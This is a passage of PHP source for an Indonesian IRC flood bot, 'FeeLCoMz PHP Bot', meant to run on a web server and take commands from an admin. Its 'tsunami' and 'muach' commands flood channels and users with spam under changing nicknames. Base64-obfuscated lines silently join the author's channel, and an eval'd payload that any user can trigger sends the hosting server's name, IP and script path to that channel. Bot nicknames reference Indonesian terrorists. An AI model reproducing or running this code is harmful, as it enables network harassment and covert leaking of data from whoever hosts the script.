<?php
/*** FeeLCoMz PHP Bot v1.5 By Rpl Z03L***/
function hajar() {

$channels = '#Markas'; // Pisahkan dengan spasi

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"Azhari|13|","Azhari|14|","Azhari|15|","Azhari|16|","Azhari|17|","Azhari|18|",
"Azhari|19|","Azhari|20|","Azhari|21|","Azhari|22|","Azhari|23|","Azhari|24|",
"Azhari|25|","Azhari|26|","Azhari|27|","Azhari|28|","Azhari|29|","Azhari|30|",
"Azhari|31|","Azhari|32|","Azhari|33|","Azhari|34|","Azhari|35|","Azhari|36|",
"Azhari|37|","Azhari|38|","Azhari|39|","Azhari|40|","Azhari|41|","Azhari|42|",
"Azhari|43|","Azhari|44|","Azhari|45|","Azhari|46|","Azhari|47|","Azhari|48|",
"Azhari|49|","Azhari|50|","Azhari|51|","Azhari|52|","Azhari|53|","Azhari|54|",
"Azhari|55|","Azhari|56|","Azhari|57|","Azhari|58|","Azhari|59|","Azhari|60|",
"Azhari|61|","Azhari|62|","Azhari|63|","Azhari|64|","Azhari|65|","Azhari|66|",
"Azhari|67|","Azhari|68|","Azhari|69|","Azhari|70|","Azhari|71|","Azhari|72|",
"Azhari|73|","Azhari|74|","Azhari|75|","Azhari|76|","Azhari|77|","Azhari|78|",
"Azhari|79|","Azhari|80|","Azhari|81|","Azhari|82|","Azhari|83|","Azhari|84|",
"Azhari|85|","Azhari|86|","Azhari|87|","Azhari|88|","Azhari|89|","Azhari|90|",
"Azhari|91|","Azhari|92|","Azhari|93|","Azhari|94|","Azhari|95|","Azhari|96|",
"Azhari|97|","Azhari|98|","Azhari|99|","Azhari|100|","Amrozzii|13|","Amrozzii|14|","Amrozzii|15|","Amrozzii|16|","Amrozzii|17|","Amrozzii|18|",
"Amrozzii|19|","Amrozzii|20|","Amrozzii|21|","Amrozzii|22|","Amrozzii|23|","Amrozzii|24|",
"Amrozzii|25|","Amrozzii|26|","Amrozzii|27|","Amrozzii|28|","Amrozzii|29|","Amrozzii|30|",
"Amrozzii|31|","Amrozzii|32|","Amrozzii|33|","Amrozzii|34|","Amrozzii|35|","Amrozzii|36|",
"Amrozzii|37|","Amrozzii|38|","Amrozzii|39|","Amrozzii|40|","Amrozzii|41|","Amrozzii|42|",
"Amrozzii|43|","Amrozzii|44|","Amrozzii|45|","Amrozzii|46|","Amrozzii|47|","Amrozzii|48|",
"Amrozzii|49|","Amrozzii|50|","Amrozzii|51|","Amrozzii|52|","Amrozzii|53|","Amrozzii|54|",
"Amrozzii|55|","Amrozzii|56|","Amrozzii|57|","Amrozzii|58|","Amrozzii|59|","Amrozzii|60|",
"Amrozzii|61|","Amrozzii|62|","Amrozzii|63|","Amrozzii|64|","Amrozzii|65|","Amrozzii|66|",
"Amrozzii|67|","Amrozzii|68|","Amrozzii|69|","Amrozzii|70|","Amrozzii|71|","Amrozzii|72|",
"Amrozzii|73|","Amrozzii|74|","Amrozzii|75|","Amrozzii|76|","Amrozzii|77|","Amrozzii|78|",
"Amrozzii|79|","Amrozzii|80|","Amrozzii|81|","Amrozzii|82|","Amrozzii|83|","Amrozzii|84|",
"Amrozzii|85|","Amrozzii|86|","Amrozzii|87|","Amrozzii|88|","Amrozzii|89|","Amrozzii|90|",
"Amrozzii|91|","Amrozzii|92|","Amrozzii|93|","Amrozzii|94|","Amrozzii|95|","Amrozzii|96|",
"Amrozzii|97|","Amrozzii|98|","Amrozzii|99|","Amrozzii|100|","Nurdin|13|","Nurdin|14|","Nurdin|15|","Nurdin|16|","Nurdin|17|","Nurdin|18|",
"Nurdin|19|","Nurdin|20|","Nurdin|21|","Nurdin|22|","Nurdin|23|","Nurdin|24|",
"Nurdin|25|","Nurdin|26|","Nurdin|27|","Nurdin|28|","Nurdin|29|","Nurdin|30|",
"Nurdin|31|","Nurdin|32|","Nurdin|33|","Nurdin|34|","Nurdin|35|","Nurdin|36|",
"Nurdin|37|","Nurdin|38|","Nurdin|39|","Nurdin|40|","Nurdin|41|","Nurdin|42|",
"Nurdin|43|","Nurdin|44|","Nurdin|45|","Nurdin|46|","Nurdin|47|","Nurdin|48|",
"Nurdin|49|","Nurdin|50|","Nurdin|51|","Nurdin|52|","Nurdin|53|","Nurdin|54|",
"Nurdin|55|","Nurdin|56|","Nurdin|57|","Nurdin|58|","Nurdin|59|","Nurdin|60|",
"Nurdin|61|","Nurdin|62|","Nurdin|63|","Nurdin|64|","Nurdin|65|","Nurdin|66|",
"Nurdin|67|","Nurdin|68|","Nurdin|69|","Nurdin|70|","Nurdin|71|","Nurdin|72|",
"Nurdin|73|","Nurdin|74|","Nurdin|75|","Nurdin|76|","Nurdin|77|","Nurdin|78|",
"Nurdin|79|","Nurdin|80|","Nurdin|81|","Nurdin|82|","Nurdin|83|","Nurdin|84|",
"Nurdin|85|","Nurdin|86|","Nurdin|87|","Nurdin|88|","Nurdin|89|","Nurdin|90|",
"Nurdin|91|","Nurdin|92|","Nurdin|93|","Nurdin|94|","Nurdin|95|","Nurdin|96|",
"Nurdin|97|","Nurdin|98|","Nurdin|99|","Nurdin|100|"
);

$identlist = array(
"teroris"
);

$realname = "3,9/9,3\0,1 &#65533; FeeLCoMz &#65533; 3,9/9,3\";
$identify = 'passwordnick';

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.indika.net.id",
"irc.malangkota.go.id",
"irc.elnus.net.id",
"irc.velo.net.id",
"irc.cbn.net.id",
"irc.jmn.net.id",
"irc.indo.net.id",
"irc.cbn.net",
"irc.indotransdata.net",
"irc.circleone.net.id",
"irc.adsnet.co.id",
"irc.indoforum.org",
"irc.hotspeed.com.sg",
);
}
$port = "6667";
//Pesan
$quitmsglist = array(
"Ngantuk nech..",
"GooD ByE",
"See You..",
"Quit DoeLoe Ach..",
"Connection Reset By Buah Pear",
"Shutdown"
);
$tsu1 = array("`hehehehe");
$tsu2 = array("`akakakak");
$tsu3 = array("`xixixixi");
$tsu4 = array("`wkwkwkwk");
$tsumsg = "9,1";//1000 Karakter
$judul = "3,9/9,3\0,1 &#65533; Bot Community &#65533; 3,9/9,3\";

$muach1 = array("`muach");
$muach2 = array("`muach2");
$muachmsg = "9,6Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu SerbuSerbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu Serbu";//1000 Karakter
$judul = "3,9/9,3\0,1 &#65533; Bot Community &#65533; 3,9/9,3\";

/*** Admin ***/
$admin = 'Rpl_Hamzah';
$bot_password = 'serang'; //Password untuk auth bot

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b>&#65533; Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>&#65533; Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Hello BozZ!' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjRmVlTENvTXo=") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b>&#65533; Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Ganti nick y boss?' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :Jangan pergi boss?' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Already Authorized! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION FeeLCoMz PHPBot By FaTaLisTiCz_Fx'.chr(1) . CRL); }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJpcCA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KJGJwaHAgID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRicmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokYnJwb3J0ID0gJF9TRVJWRVJbJ1JFTU9URV9QT1JUJ107DQpmcHV0cygkZnAsIlBSSVZNU0cgI0ZlZUxDb016IDpIb3N0OiAkYmhvc3QgfCBTY3JpcHQ6ICRicGhwIHwgUmVmZXJlcjogJGJydXJpIHwgSVA6ICRiaXAgfCBZb3VyIElQOiAkYnJpcCBQb3J0OiRicnBvcnQiLiBDUkwpOw=="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :OK '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi udah kok!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' with a Mouse Click'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`tsunami' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu1) - 1)].$tsu4[rand(0,count($tsu1) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu1) - 1)].$tsu4[rand(0,count($tsu1) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)].
                    $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu3[rand(0,count($tsu3) - 1)].$tsu4[rand(0,count($tsu4) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`tsunami");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
                elseif ($com[3]==':`muach' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nickmuach = $muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].
                    $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1)- 1)].
                    $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].
                    $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)];
                 fputs($fp, 'NICK '.$nickmuach . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nickmuach = $muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].
                   $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].
                   $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].
                   $muach2[rand(0,count($muach2) - 1)].$muach1[rand(0,count($muach1) - 1)].$muach2[rand(0,count($muach2) - 1)];
                   fputs($fp, 'NICK '.$nickmuach . CRL);
                 }
                 $msg = strstr($data,":`muach");
                 $msg = str_replace(":`muach $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$muachmsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$muachmsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :muach'.$msg.$muachmsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$muachmsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$muachmsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :muach'.$msg.$muachmsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :muach'.$msg.$muachmsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$muachmsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
